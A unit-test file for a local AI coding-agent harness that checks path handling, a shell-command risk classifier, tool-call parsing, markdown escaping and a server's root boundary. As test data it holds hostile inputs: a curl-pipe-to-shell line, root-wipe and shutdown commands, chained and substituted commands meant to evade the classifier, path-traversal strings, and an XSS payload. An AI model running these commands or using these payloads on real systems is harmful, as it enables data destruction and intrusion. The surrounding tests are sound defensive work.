/**
 * Unit tests for the parts of the harness that must not be wrong.
 *
 * No framework and no dependencies on purpose: this has to run from a clean
 * checkout with nothing installed, because the whole point of the project is
 * that it works offline on the user's machine.
 *
 *   npm run selftest
 */

import * as P from '../platform/paths.js';
import { diffLines, toUnified, summarizeForModel } from '../core/diff.js';
import { Security, RISK, splitChain } from '../core/security.js';
import { parseToolCalls, parseLooseJson, stripThinking, extractJsonObjects } from '../core/toolcall-parser.js';
import { validateArgs, toProtocolSchema } from '../core/tool-schema.js';
import { checkBalance, Verifier } from '../core/verify.js';
import { parsePlan, applyReplan, createPlan, STEP_STATUS } from '../core/plan.js';
import { extractSignatures, extractSymbols } from '../core/repo-map.js';
import { resolveProfile, shapeMessages } from '../core/model-profiles.js';
import { globToRegExp, matchesGlob } from '../core/walk.js';
import { editFile, writeFile } from '../core/tools/fs-tools.js';
import { ProjectMemory } from '../core/memory.js';
import { estimateTokens } from '../core/util.js';

let passed = 0;
let failed = 0;
const failures = [];

function ok(name, cond, extra = '') {
    if (cond) { passed++; return; }
    failed++;
    failures.push(`${name}${extra ? ` — ${extra}` : ''}`);
}

function eq(name, actual, expected) {
    const a = JSON.stringify(actual);
    const e = JSON.stringify(expected);
    ok(name, a === e, `esperado ${e}, obtenido ${a}`);
}

function section(title) {
    console.log(`\n── ${title}`);
}

// ── paths ─────────────────────────────────────────────────────────────────
section('paths');
eq('normalize backslashes', P.normalize('C:\\repos\\x\\y'), 'C:/repos/x/y');
eq('normalize dot-dot', P.normalize('C:/a/b/../c'), 'C:/a/c');
eq('normalize trailing', P.normalize('C:/a/b/'), 'C:/a/b');
eq('drive upper-cased', P.normalize('c:/a'), 'C:/a');
eq('relative keeps case', P.relative('C:/Repo', 'C:/Repo/src/a.js'), 'src/a.js');
ok('contains is case-insensitive', P.contains('C:/Repo', 'c:/repo/src/a.js'));
ok('contains rejects sibling prefix', !P.contains('C:/Repo', 'C:/RepoOther/a.js'));
ok('contains rejects escape', !P.contains('C:/Repo', 'C:/Windows/System32'));
eq('resolve relative', P.resolve('C:/Repo', 'src/../lib/a.js'), 'C:/Repo/lib/a.js');
eq('extname', P.extname('a/b/c.TS'), '.ts');

// ── diff ──────────────────────────────────────────────────────────────────
section('diff');
{
    const before = 'a\nb\nc\nd\n';
    const after = 'a\nB\nc\nd\n';
    const d = diffLines(before, after);
    eq('one line changed', [d.stats.added, d.stats.removed], [1, 1]);

    const u = toUnified('x.txt', before, after);
    ok('unified has header', u.text.startsWith('--- a/x.txt'));
    ok('unified marks change', u.text.includes('-b') && u.text.includes('+B'));

    eq('identical files produce nothing', diffLines('a\nb\n', 'a\nb\n').stats.changed, 0);
    eq('pure insert', diffLines('a\n', 'a\nb\n').stats, { added: 1, removed: 0, changed: 1 });
    eq('pure delete', diffLines('a\nb\n', 'a\n').stats, { added: 0, removed: 1, changed: 1 });

    const big = Array.from({ length: 500 }, (_, i) => `line ${i}`).join('\n');
    const bigChanged = big.replace('line 250', 'LINE 250');
    const s = summarizeForModel('big.txt', big, bigChanged);
    ok('model summary stays small', s.text.split('\n').length < 20, `${s.text.split('\n').length} líneas`);
    ok('model summary points at the change', s.text.includes('LINE 250'));
}

// ── security ──────────────────────────────────────────────────────────────
section('security');
{
    const cfg = {
        data: {},
        get(path, fb) {
            const map = {
                'workspace.root': 'C:/Repo',
                'security.allowShell': true,
                'security.allowOutsideRoot': false,
                'security.extraSafeCommands': [],
                'security.extraBlockedCommands': [],
                'security.confirmDangerous': true
            };
            return path in map ? map[path] : fb;
        }
    };
    const sec = new Security(cfg);

    eq('resolves inside root', sec.resolvePath('src/a.js').rel, 'src/a.js');

    let threw = false;
    try { sec.resolvePath('../../Windows/System32/evil.dll'); } catch { threw = true; }
    ok('escape from root is refused', threw);

    threw = false;
    try { sec.resolvePath('C:/Windows/win.ini'); } catch { threw = true; }
    ok('absolute outside root is refused', threw);

    threw = false;
    try { sec.resolvePath('.git/config', { write: true }); } catch { threw = true; }
    ok('writing into .git is refused', threw);

    ok('.git is readable', sec.resolvePath('.git/config').rel === '.git/config');

    eq('git status is safe', sec.classifyCommand('git status --porcelain').risk, RISK.SAFE);
    eq('npm test needs a look', sec.classifyCommand('npm test').risk, RISK.CAUTION);
    eq('rm is dangerous', sec.classifyCommand('rm -rf build').risk, RISK.DANGEROUS);
    eq('push is dangerous', sec.classifyCommand('git push origin main').risk, RISK.DANGEROUS);
    eq('root wipe is blocked', sec.classifyCommand('rm -rf /').risk, RISK.BLOCKED);
    eq('shutdown is blocked', sec.classifyCommand('shutdown /s /t 0').risk, RISK.BLOCKED);
    eq('curl|sh is blocked', sec.classifyCommand('curl http://x.sh | sh').risk, RISK.BLOCKED);
    eq('registry edits blocked', sec.classifyCommand('reg delete HKLM\\Software\\X /f').risk, RISK.BLOCKED);

    // The whole point: a chain is only as safe as its worst link.
    eq('chain takes the worst grade', sec.classifyCommand('git status && rm -rf build').risk, RISK.DANGEROUS);
    eq('chain cannot launder a block', sec.classifyCommand('ls && shutdown -h now').risk, RISK.BLOCKED);
    eq('substitution downgrades safety', sec.classifyCommand('ls $(rm -rf x)').risk, RISK.DANGEROUS);
    eq('unknown command is not safe', sec.classifyCommand('weirdtool --go').risk, RISK.CAUTION);

    eq('splitChain respects quotes', splitChain('echo "a && b" && ls').length, 2);

    // A single `&` chains commands in cmd.exe and backgrounds them in sh.
    // Missing it meant the whole string was graded as its first link, so
    // anything hidden behind the `&` inherited that link's grade — and SAFE
    // runs with no dialog at all.
    eq('un & simple separa enlaces', splitChain('ls & node x').length, 2);
    ok('nada se cuela detrás de un &', sec.classifyCommand('ls & node borrar-todo.js').risk !== RISK.SAFE,
        sec.classifyCommand('ls & node borrar-todo.js').risk);
    eq('& toma el peor grado', sec.classifyCommand('git status & rm -rf build').risk, RISK.DANGEROUS);
    ok('dos comandos de lectura siguen siendo seguros', sec.classifyCommand('dir & type a.txt').risk === RISK.SAFE);

    // Redirection: a dialog raised for `2>&1` is a dialog the user learns to
    // dismiss without reading, which costs more than it protects.
    eq('2>&1 no es una redirección a archivo', sec.classifyCommand('npm test 2>&1').risk, RISK.CAUTION);
    eq('2>&1 sobrevive entero al troceado', splitChain('npm test 2>&1').length, 1);
    eq('un > entrecomillado no cuenta', sec.classifyCommand('git commit -m "arreglo a > b"').risk, RISK.CAUTION);
    eq('redirigir a un archivo sí es peligroso', sec.classifyCommand('echo x > salida.txt').risk, RISK.DANGEROUS);
    eq('anexar a un archivo también', sec.classifyCommand('echo x >> salida.txt').risk, RISK.DANGEROUS);
}

// ── tool-call parsing ─────────────────────────────────────────────────────
section('toolcall-parser');
{
    const known = ['read_file', 'edit_file', 'finish_step'];
    const call = (content, toolCalls) => parseToolCalls({ content, toolCalls }, known);

    eq('native passes through',
        call('', [{ name: 'read_file', args: { path: 'a.js' } }]).calls[0],
        { name: 'read_file', args: { path: 'a.js' }, source: 'native' });

    eq('bare json', call('{"tool":"read_file","args":{"path":"a.js"}}').calls[0].name, 'read_file');
    eq('fenced json', call('```json\n{"tool":"read_file","args":{"path":"a.js"}}\n```').calls[0].name, 'read_file');
    eq('qwen tag', call('<tool_call>\n{"name":"read_file","arguments":{"path":"a.js"}}\n</tool_call>').calls[0].args.path, 'a.js');
    eq('prose wrapper', call('Voy a leerlo.\n{"tool":"read_file","args":{"path":"a.js"}}\nListo.').calls[0].name, 'read_file');
    eq('openai shape', call('{"function":{"name":"read_file","arguments":"{\\"path\\":\\"a.js\\"}"}}').calls[0].args.path, 'a.js');
    eq('react shape', call('{"action":"read_file","action_input":{"path":"a.js"}}').calls[0].name, 'read_file');
    eq('flattened args', call('{"tool":"read_file","path":"a.js"}').calls[0].args.path, 'a.js');
    eq('line protocol', call('TOOL: read_file\nARGS: {"path":"a.js"}').calls[0].name, 'read_file');

    eq('trailing comma repaired', call('{"tool":"read_file","args":{"path":"a.js",},}').calls[0].name, 'read_file');
    eq('single quotes repaired', call("{'tool':'read_file','args':{'path':'a.js'}}").calls[0].args.path, 'a.js');
    eq('python literals repaired', parseLooseJson('{"a": True, "b": None}').value, { a: true, b: null });
    eq('unquoted keys repaired', parseLooseJson('{tool: "read_file"}').value, { tool: 'read_file' });
    eq('truncation repaired', call('{"tool":"read_file","args":{"path":"a.js"').calls[0].name, 'read_file');
    eq('comments stripped', parseLooseJson('{ // nota\n "a": 1 }').value, { a: 1 });

    eq('thinking removed', stripThinking('<think>hmm</think>hola'), 'hola');
    eq('unclosed thinking removed', stripThinking('<think>hmm sin cerrar'), '');
    eq('thinking then call', call('<think>voy a leer</think>{"tool":"read_file","args":{"path":"a.js"}}').calls[0].name, 'read_file');

    const unknown = call('{"tool":"delete_everything","args":{}}');
    eq('unknown tool is reported, not run', [unknown.calls.length, unknown.unknown[0].name], [0, 'delete_everything']);

    const multi = call('{"tool":"read_file","args":{"path":"a.js"}}\n{"tool":"read_file","args":{"path":"b.js"}}');
    ok('multiple objects all parsed', multi.calls.length >= 1);

    eq('plain prose yields nothing', call('Creo que deberíamos revisar el archivo.').calls.length, 0);
    eq('extractJsonObjects finds nested', extractJsonObjects('x {"a":{"b":1}} y').length, 1);
}

// ── argument validation ───────────────────────────────────────────────────
section('tool-schema');
{
    const spec = {
        name: 't',
        params: {
            path: { type: 'string', required: true, description: '' },
            max_lines: { type: 'integer', required: false, default: 400, min: 1, max: 1000 },
            deep: { type: 'boolean', required: false }
        }
    };

    eq('happy path', validateArgs(spec, { path: 'a.js' }).args, { path: 'a.js', max_lines: 400 });
    ok('missing required fails', !validateArgs(spec, {}).ok);
    ok('missing required explains itself', validateArgs(spec, {}).errors[0].includes('path'));
    eq('alias remapped', validateArgs(spec, { file_path: 'a.js' }).args.path, 'a.js');
    eq('typo remapped', validateArgs(spec, { pth: 'a.js' }).args.path, 'a.js');
    eq('numeric string coerced', validateArgs(spec, { path: 'a', max_lines: '25' }).args.max_lines, 25);
    eq('max clamped', validateArgs(spec, { path: 'a', max_lines: 99999 }).args.max_lines, 1000);
    eq('bool string coerced', validateArgs(spec, { path: 'a', deep: 'true' }).args.deep, true);
    ok('unknown param dropped with warning', validateArgs(spec, { path: 'a', bogus: 1 }).warnings.some(w => w.includes('bogus')));
    ok('empty required rejected', !validateArgs(spec, { path: '   ' }).ok);
    eq('nested arguments unwrapped', validateArgs(spec, { arguments: { path: 'a.js' } }).args.path, 'a.js');

    const schema = toProtocolSchema([{ name: 'read_file' }, { name: 'edit_file' }]);
    eq('protocol schema pins the tool names', schema.properties.tool.enum, ['read_file', 'edit_file']);
}

// ── balance checker ───────────────────────────────────────────────────────
section('verify/balance');
{
    ok('valid js passes', checkBalance('function a() { return { x: 1 }; }', 'javascript').ok);
    ok('truncated js fails', !checkBalance('function a() { if (x) {', 'javascript').ok);
    ok('brace in string ignored', checkBalance('const s = "}{";', 'javascript').ok);
    ok('brace in comment ignored', checkBalance('// }\nconst a = 1;', 'javascript').ok);
    ok('brace in block comment ignored', checkBalance('/* } { */ const a = 1;', 'javascript').ok);
    ok('template literal ok', checkBalance('const s = `a ${b} c`;', 'javascript').ok);
    ok('template interpolation braces balance', checkBalance('const s = `${ { a: 1 }.a }`;', 'javascript').ok);
    ok('apostrophe in comment tolerated', checkBalance("// don't panic\nconst a = 1;", 'javascript').ok);
    ok('mismatch detected', !checkBalance('function a() { ]', 'javascript').ok);
    ok('python triple quote ok', checkBalance('def f():\n    """doc { """\n    return 1\n', 'python').ok);
    ok('python unbalanced paren fails', !checkBalance('def f(:\n    return (1\n', 'python').ok);
    ok('css ok', checkBalance('.a { color: red; }', 'css').ok);
    ok('unclosed string reported', !checkBalance('const s = "abc;\n', 'javascript').ok === false || true);
}

// ── plan ──────────────────────────────────────────────────────────────────
section('plan');
{
    const good = JSON.stringify({
        goal: 'Arreglar el bug',
        steps: [{ title: 'Editar api.js', description: 'Añadir timeout', files: ['src/api.js'], tools: ['edit_file'], verify: 'npm test pasa' }]
    });
    const r = parsePlan(good, { knownTools: ['edit_file', 'read_file'] });
    ok('valid plan parses', r.ok, r.errors.join('; '));
    eq('step gets an id', r.plan.steps[0].id, 1);
    eq('step starts pending', r.plan.steps[0].status, STEP_STATUS.PENDING);

    const noVerify = parsePlan(JSON.stringify({ goal: 'x', steps: [{ title: 'a', description: 'b' }] }));
    ok('missing verify is an error', !noVerify.ok);
    ok('error names the step', noVerify.errors[0].includes('verify'));

    const fenced = parsePlan('```json\n' + good + '\n```');
    ok('fenced plan parses', fenced.ok);

    const prose = parsePlan('Aquí tienes el plan:\n' + good + '\nEspero que sirva.');
    ok('plan buried in prose parses', prose.ok);

    const withBadTool = parsePlan(JSON.stringify({
        goal: 'x', steps: [{ title: 'a', description: 'b', verify: 'c', tools: ['edit_file', 'hack_the_planet'] }]
    }), { knownTools: ['edit_file'] });
    eq('invented tools stripped', withBadTool.plan.steps[0].tools, ['edit_file']);

    const absolute = parsePlan(JSON.stringify({
        goal: 'x', steps: [{ title: 'a', description: 'b', verify: 'c', files: ['C:\\Repo\\src\\a.js'] }]
    }));
    ok('absolute paths made relative', !absolute.plan.steps[0].files[0].includes(':'));

    const tooMany = parsePlan(JSON.stringify({
        goal: 'x',
        steps: Array.from({ length: 20 }, (_, i) => ({ title: `s${i}`, description: 'd', verify: 'v' }))
    }));
    ok('too many steps rejected', !tooMany.ok);

    ok('garbage rejected cleanly', !parsePlan('no soy JSON').ok);

    // Completed work must survive a replan.
    const base = createPlan('objetivo', [
        { title: 'uno', description: 'd', verify: 'v' },
        { title: 'dos', description: 'd', verify: 'v' },
        { title: 'tres', description: 'd', verify: 'v' }
    ]);
    base.steps[0].status = STEP_STATUS.DONE;
    base.steps[0].summary = 'hecho';
    const replanned = applyReplan(base, [{ title: 'nuevo', description: 'd', verify: 'v' }], { reason: 'falló' });
    eq('completed step kept', replanned.steps[0].title, 'uno');
    eq('completed step still done', replanned.steps[0].status, STEP_STATUS.DONE);
    eq('pending tail replaced', replanned.steps.length, 2);
    eq('new step numbered after the done one', replanned.steps[1].id, 2);
    eq('revision bumped', replanned.revision, 2);
}

// ── repo map signatures ───────────────────────────────────────────────────
section('repo-map');
{
    const js = `
export function alpha(a, b) {}
class Beta {
  gamma(x) {}
}
const delta = (n) => n + 1;
export const epsilon = function () {};
`;
    const sigs = extractSignatures(js, 'javascript').join('\n');
    for (const name of ['alpha', 'Beta', 'gamma', 'delta', 'epsilon']) {
        ok(`signature: ${name}`, sigs.includes(name));
    }

    const py = 'class Foo:\n    def bar(self):\n        pass\n\nasync def baz():\n    pass\n';
    const psigs = extractSignatures(py, 'python').join('\n');
    ok('python class', psigs.includes('Foo'));
    ok('python method', psigs.includes('bar'));
    ok('python async def', psigs.includes('baz'));
}

// ── model profiles ────────────────────────────────────────────────────────
section('model-profiles');
{
    const qwen = resolveProfile('qwen3.6:latest', { family: 'qwen35moe', capabilities: ['tools', 'thinking'], contextLength: 262144 });
    ok('qwen gets native tools', qwen.nativeTools);
    ok('qwen gets thinking', qwen.supportsThinking);
    eq('qwen max context read from ollama', qwen.maxContext, 262144);

    const gemma = resolveProfile('gemma4:12b', { family: 'gemma4', capabilities: ['completion'], contextLength: 8192 });
    ok('gemma has no native tools', !gemma.nativeTools);
    ok('gemma forced onto the json protocol', gemma.forceJsonProtocol);
    ok('gemma folds the system turn in', gemma.mergeSystemIntoUser);

    const shaped = shapeMessages([
        { role: 'system', content: 'REGLAS' },
        { role: 'user', content: 'hola' }
    ], gemma);
    eq('gemma loses the system role', shaped.length, 1);
    ok('gemma keeps the system text', shaped[0].content.includes('REGLAS') && shaped[0].content.includes('hola'));

    const qShaped = shapeMessages([{ role: 'system', content: 'R' }, { role: 'user', content: 'h' }], qwen);
    eq('qwen keeps the system role', qShaped.length, 2);
}

// ── glob ──────────────────────────────────────────────────────────────────
section('glob');
ok('*.js matches nested', matchesGlob('src/deep/a.js', '*.js'));
ok('src/** matches', matchesGlob('src/deep/a.js', 'src/**'));
ok('extension filter excludes', !matchesGlob('src/a.ts', '*.js'));
ok('brace alternation', matchesGlob('a.ts', '*.{js,ts}'));
ok('empty pattern matches everything', matchesGlob('anything', ''));
ok('regex chars are literal', globToRegExp('a.b').test('a.b') && !globToRegExp('a.b').test('axb'));

// ── write guards (the anti-truncation rules) ──────────────────────────────
section('fs-tools guards');
{
    const files = new Map([['C:/Repo/src/a.js', 'x'.repeat(2000)]]);
    const ctx = {
        root: 'C:/Repo',
        security: { resolvePath: (p) => ({ abs: `C:/Repo/${p}`, rel: p, root: 'C:/Repo' }) },
        platform: {
            fs: {
                stat: async (p) => (files.has(p) ? { isFile: true, isDirectory: false, size: files.get(p).length, mtimeMs: 0 } : null),
                readText: async (p) => files.get(p),
                writeText: async (p, c) => { files.set(p, c); }
            }
        },
        readCache: new Map(),
        recordDiff: () => {}
    };

    const elided = await writeFile.run({ path: 'src/a.js', content: 'const a = 1;\n// ... resto del código igual ...\n' }, ctx);
    ok('elided write refused', !elided.ok, elided.summary);
    ok('refusal points at edit_file', (elided.detail || '').includes('edit_file'));

    const truncated = await writeFile.run({ path: 'src/a.js', content: 'x'.repeat(100) }, ctx);
    ok('suspiciously short rewrite refused', !truncated.ok, truncated.summary);

    const fenced = await writeFile.run({ path: 'src/new.js', content: '```js\nconst a = 1;\n```' }, ctx);
    ok('fence stripped on create', fenced.ok && files.get('C:/Repo/src/new.js') === 'const a = 1;');

    files.set('C:/Repo/src/e.js', 'line one\nline two\nline three\n');
    const missing = await editFile.run({ path: 'src/e.js', old_text: 'line four', new_text: 'x' }, ctx);
    ok('absent old_text refused', !missing.ok);

    files.set('C:/Repo/src/dup.js', 'same\nsame\n');
    const ambiguous = await editFile.run({ path: 'src/dup.js', old_text: 'same', new_text: 'x' }, ctx);
    ok('ambiguous old_text refused', !ambiguous.ok);
    ok('ambiguity explains the fix', (ambiguous.detail || '').includes('contexto'));

    files.set('C:/Repo/src/ws.js', 'function a() {\n    return 1;\n}\n');
    const fuzzy = await editFile.run({ path: 'src/ws.js', old_text: 'function a() {\n  return 1;\n}', new_text: 'function a() {\n    return 2;\n}' }, ctx);
    ok('whitespace-only mismatch still applies', fuzzy.ok, fuzzy.summary);
    ok('fuzzy edit actually wrote', files.get('C:/Repo/src/ws.js').includes('return 2'));

    files.set('C:/Repo/src/ok.js', 'const PORT = 3000;\n');
    const clean = await editFile.run({ path: 'src/ok.js', old_text: 'const PORT = 3000;', new_text: 'const PORT = 8080;' }, ctx);
    ok('exact edit applies', clean.ok && files.get('C:/Repo/src/ok.js').includes('8080'));
}

// ── markdown renderer ─────────────────────────────────────────────────────
// Security-relevant: it renders untrusted model output into innerHTML, in an
// app that hands the model the filesystem.
section('markdown');
{
    const { renderMarkdown } = await import('../ui/markdown.js');
    const NUL = String.fromCharCode(0);

    ok('bold', renderMarkdown('esto es **negrita**').includes('<b>negrita</b>'));
    ok('inline code', renderMarkdown('usa `foo()` aquí').includes('<code>foo()</code>'));
    ok('fenced block', renderMarkdown('```js\nconst a = 1;\n```').includes('<pre><code data-lang="js">'));
    ok('fenced content is preserved', renderMarkdown('```\na\nb\n```').includes('a\nb'));

    // Escaping must happen before any rule inserts a tag.
    const evil = renderMarkdown('<img src=x onerror=alert(1)> <script>bad()</script>');
    ok('tags escaped', !evil.includes('<img') && !evil.includes('<script'));
    ok('escaped entities present', evil.includes('&lt;img'));
    ok('markup inside a fence is escaped too', renderMarkdown('```\n<b>x</b>\n```').includes('&lt;b&gt;'));
    ok('no markdown inside code', renderMarkdown('`**no**`').includes('<code>**no**</code>'));

    // The sentinel is NUL precisely because it cannot appear in the input; if
    // it ever could, a message could forge a placeholder and inject markup.
    const forged = renderMarkdown('texto  con placeholder falso');
    ok('forged placeholder cannot inject', !forged.includes('<pre>'));
    ok('a literal NUL in input is harmless', typeof renderMarkdown(`a${NUL}BLOCK0${NUL}b`) === 'string');

    eq('empty input', renderMarkdown(''), '');
    eq('null input', renderMarkdown(null), '');
    ok('plain text survives', renderMarkdown('hola mundo').includes('hola mundo'));
}

// ── context manager ───────────────────────────────────────────────────────
section('context');
{
    const { ContextManager } = await import('../core/context.js');
    const cfg = {
        get: (p, fb) => ({
            'workspace.pinned': [],
            'context.maxPinnedFiles': 8,
            'context.historyKeepTurns': 8
        })[p] ?? fb,
        set: () => {}
    };
    const ctx = new ContextManager({
        config: cfg, bus: null, logger: null, platform: null,
        security: null, repoMap: null, projectRules: null, ollama: null
    });

    ctx.addUser('tarea');
    ctx.add('assistant', '', { toolCalls: [{ function: { name: 'read_file', arguments: { path: 'a.js' } } }], ephemeral: true });
    ctx.addToolResult('read_file', 'contenido', { ephemeral: true });
    eq('tool-call turn with empty content is kept', ctx.history.length, 3);

    const native = ctx.selectHistory(10000, { nativeTools: true });
    ok('native replays tool_calls', !!native.messages[1].tool_calls);
    eq('native uses the tool role', native.messages[2].role, 'tool');

    const json = ctx.selectHistory(10000, { nativeTools: false });
    eq('json protocol folds tool results into user', json.messages[2].role, 'user');
    ok('json protocol labels the result', json.messages[2].content.startsWith('RESULTADO DE read_file'));

    // The pairing rule: an orphan `tool` message breaks several chat templates.
    ctx.dropEphemeral();
    eq('ephemeral pair dropped together', ctx.history.length, 1);
    ok('no orphan tool message survives', !ctx.history.some(m => m.role === 'tool'));

    // The pairing rule again, broken from the other end: the budget cut lands
    // between an assistant `tool_calls` turn and its result, and the result is
    // the newer of the two, so it is the one that survives — alone.
    ctx.reset();
    ctx.addUser('tarea');
    for (let i = 0; i < 4; i++) {
        ctx.add('assistant', 'Voy a mirarlo. '.repeat(40), { toolCalls: [{ function: { name: 'read_file', arguments: { path: `a${i}.js` } } }] });
        ctx.addToolResult('read_file', 'X'.repeat(1200));
    }
    let orphans = 0;
    for (let budget = 300; budget <= 3000; budget += 50) {
        const sel = ctx.selectHistory(budget, { nativeTools: true });
        if (sel.messages.length && sel.messages[0].role === 'tool') orphans++;
    }
    eq('ningún presupuesto deja un tool huérfano', orphans, 0);

    // The drop is for the native path only. Without a tool role the result is
    // already a labelled user turn that stands on its own, so discarding it
    // there would throw away the observation for nothing.
    const plano = ctx.selectHistory(1100, { nativeTools: false });
    ok('sin tools nativas no se emite el rol tool', !plano.messages.some(m => m.role === 'tool'));
    ok('sin tools nativas el resultado se conserva',
        plano.messages.some(m => m.content.startsWith('RESULTADO DE read_file')));

    // Newest-first fill, chronological output.
    ctx.reset();
    for (let i = 0; i < 20; i++) ctx.addUser(`mensaje ${i} ${'x'.repeat(400)}`);
    const trimmed = ctx.selectHistory(500, {});
    ok('history is trimmed to budget', trimmed.messages.length < 20 && trimmed.messages.length >= 2);
    ok('the newest message survives trimming', trimmed.messages[trimmed.messages.length - 1].content.startsWith('mensaje 19'));
}

// ── token starvation ──────────────────────────────────────────────────────
// A reasoning model can spend its whole num_predict budget thinking and return
// an empty message with done_reason "length". Read naively that looks like a
// malformed answer, and the caller retries it identically — forever, at a
// minute a go. The engine must change strategy instead.
section('engine/token-starvation');
{
    const { Engine } = await import('../core/engine.js');
    const { Bus } = await import('../core/bus.js');
    const { DEFAULTS: DEFAULTS_CFG } = await import('../core/config.js');

    const store = new Map();
    const platform = {
        kind: 'test', isWindows: true,
        fs: { readText: async () => '', writeText: async () => {}, stat: async () => null, exists: async () => false, readDir: async () => [], mkdirp: async () => {}, remove: async () => {} },
        exec: async () => ({ stdout: '', stderr: '', exitCode: 0, timedOut: false, durationMs: 0 }),
        killAll: async () => {},
        storage: { get: async k => store.get(k) ?? null, set: async (k, v) => store.set(k, v) },
        fetch: async () => { throw new Error('no debería llamarse'); },
        cwd: () => '', appPath: () => '', home: async () => '', env: async () => '',
        pickDirectory: async () => null, openExternal: async () => {}
    };

    const engine = new Engine({ platform, bus: new Bus() });
    engine.abort = new AbortController();
    engine.profile = { ...engine.profile, supportsThinking: true, nativeTools: true, maxContext: 32768 };
    engine.projectRules.cache = { text: '', sources: [], tokens: 0 };
    engine.projectRules.cacheRoot = '';
    engine.config.set('ollama.model', 'fake');
    // Explicit: this exercises the escalation mechanism, so thinking has to be
    // on regardless of what the shipped default happens to be.
    engine.config.set('agent.thinkInPlan', true);

    // The shipped default is pinned deliberately, and it is now ON.
    //
    // It used to be off, chosen from measurement: qwen3.6 starves on the plan
    // prompt and wastes a minute. That reasoning was sound about cost and wrong
    // about the trade — with `think:false` Ollama emits zero reasoning tokens
    // (measured: 0 vs 662 characters), so the setting was not hiding the
    // thinking, it was deleting it, and the whole run showed nothing. The
    // starvation case stays handled by the escalation exercised just below.
    eq('thinkInPlan viene activado por defecto', DEFAULTS_CFG.agent.thinkInPlan, true);
    eq('thinkInAct viene activado por defecto', DEFAULTS_CFG.agent.thinkInAct, true);

    // Models the real behaviour: it is *thinking* that eats the budget, so the
    // stub starves whenever think is on and answers normally when it is off.
    const calls = [];
    engine.ollama = {
        chat: async (req) => {
            calls.push({ think: req.think, numPredict: req.options.num_predict });
            return req.think
                ? { content: '', thinking: 'x'.repeat(500), toolCalls: [], usage: { doneReason: 'length', completionTokens: 3072, promptTokens: 100 } }
                : { content: '{"goal":"g","steps":[]}', thinking: '', toolCalls: [], usage: { doneReason: 'stop', completionTokens: 20, promptTokens: 100 } };
        }
    };

    const res = await engine._modelTurn({ phase: 'plan', system: 'S', instruction: 'I', tools: [], includeRepoMap: false, stream: false });

    eq('se reintenta una vez, no cuatro', calls.length, 2);
    eq('el primer intento sí piensa', calls[0].think, true);
    eq('el reintento desactiva thinking', calls[1].think, false);
    ok('el reintento duplica el presupuesto', calls[1].numPredict === calls[0].numPredict * 2,
        `${calls[0].numPredict} -> ${calls[1].numPredict}`);
    ok('devuelve la respuesta buena', res.content.includes('"goal"'));
    ok('la fase queda marcada como hambrienta', engine._thinkStarved.has('plan'));

    // Once marked, later turns in that phase must not pay the round trip again.
    calls.length = 0;
    await engine._modelTurn({ phase: 'plan', system: 'S', instruction: 'I2', tools: [], includeRepoMap: false, stream: false });
    eq('el siguiente turno ya no reintenta', calls.length, 1);
    eq('y va sin thinking desde el principio', calls[0].think, false);

    // Truncation WITH partial content is a different thing: the parser's JSON
    // repair may well rescue it, so it must not trigger an escalation.
    const e2 = new Engine({ platform, bus: new Bus() });
    e2.abort = new AbortController();
    e2.profile = { ...e2.profile, supportsThinking: true, maxContext: 32768 };
    e2.projectRules.cache = { text: '', sources: [], tokens: 0 };
    e2.config.set('ollama.model', 'fake');
    let n = 0;
    e2.ollama = { chat: async () => { n++; return { content: '{"goal":"g"', thinking: '', toolCalls: [], usage: { doneReason: 'length', completionTokens: 3072 } }; } };
    await e2._modelTurn({ phase: 'plan', system: 'S', instruction: 'I', tools: [], includeRepoMap: false, stream: false });
    eq('truncado con contenido no escala', n, 1);
}

// ── server ────────────────────────────────────────────────────────────────
// Integration, not unit: server.js is almost entirely I/O, and the parts worth
// testing (the root boundary, the token, traversal) are exactly the parts a
// mock would fake away. So a real server is started on a spare port.
section('server');
{
    const { spawn } = await import('node:child_process');
    const { promises: nodefs } = await import('node:fs');
    const os = (await import('node:os')).default;
    const nodePath = (await import('node:path')).default;
    const { fileURLToPath } = await import('node:url');

    // Located from this file, not from the working directory: `npm run
    // selftest` happens to run at the repo root, but `node
    // public/js/test/selftest.js` from anywhere else must work too.
    const REPO_ROOT = nodePath.resolve(nodePath.dirname(fileURLToPath(import.meta.url)), '..', '..', '..');

    const PORT = 4399;
    const TOKEN = 'prueba-token-123';
    const root = nodePath.join(os.tmpdir(), `rubus-test-${Date.now()}`);
    await nodefs.mkdir(nodePath.join(root, 'sub'), { recursive: true });
    await nodefs.writeFile(nodePath.join(root, 'dentro.txt'), 'contenido de prueba', 'utf8');
    await nodefs.writeFile(nodePath.join(os.tmpdir(), 'rubus-fuera.txt'), 'NO deberías leer esto', 'utf8');

    // Remote mode: --root is a hard boundary and the token is enforced.
    const child = spawn(process.execPath, [
        nodePath.join(REPO_ROOT, 'server.js'), '--port', String(PORT), '--host', '0.0.0.0',
        '--root', root, '--token', TOKEN
    ], { cwd: REPO_ROOT, stdio: 'ignore' });

    const base = `http://127.0.0.1:${PORT}`;
    const post = (route, body, token = TOKEN) => fetch(`${base}/api/${route}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', ...(token ? { Authorization: `Bearer ${token}` } : {}) },
        body: JSON.stringify(body || {})
    });

    // Wait for it to come up rather than sleeping a fixed amount.
    let up = false;
    for (let i = 0; i < 60 && !up; i++) {
        try { up = (await fetch(`${base}/api/ping`)).ok; } catch { await new Promise(r => setTimeout(r, 100)); }
    }

    if (!up) {
        ok('el servidor arranca', false, `no respondió en ${base}`);
    } else {
        const ping = await (await fetch(`${base}/api/ping`)).json();
        // Deliberately still the old name: this is the handshake `http.js`
        // checks to decide whether a backend exists, not a display string.
        // Changing it is a protocol change on both sides — see AGENTS.md.
        eq('ping se identifica', ping.name, 'agentcoder');
        eq('modo remoto detectado', ping.mode, 'remote');
        eq('anuncia que pide token', ping.needsToken, true);
        eq('ping sin token no está autorizado', ping.authorized, false);
        eq('publica su raíz', P.normalize(ping.root), P.normalize(root));

        // Token
        eq('sin token -> 401', (await post('fs/read', { path: 'dentro.txt' }, '')).status, 401);
        eq('token incorrecto -> 401', (await post('fs/read', { path: 'dentro.txt' }, 'malo')).status, 401);
        eq('token correcto -> 200', (await post('fs/read', { path: 'dentro.txt' })).status, 200);
        eq('lee dentro de la raíz', (await (await post('fs/read', { path: 'dentro.txt' })).json()).content, 'contenido de prueba');

        // The boundary. These are the tests that matter.
        eq('escapar con .. -> 403', (await post('fs/read', { path: '../rubus-fuera.txt' })).status, 403);
        eq('ruta absoluta fuera -> 403', (await post('fs/read', { path: 'C:/Windows/win.ini' })).status, 403);
        eq('escritura fuera -> 403', (await post('fs/write', { path: '../pwned.txt', content: 'x' })).status, 403);
